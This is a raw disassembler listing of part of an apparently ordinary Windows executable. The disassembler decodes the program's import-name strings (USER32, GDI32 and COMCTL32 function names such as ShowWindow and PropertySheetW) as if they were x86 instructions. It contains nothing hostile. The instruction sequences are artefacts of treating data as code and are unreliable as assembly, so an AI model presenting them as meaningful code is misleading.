  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
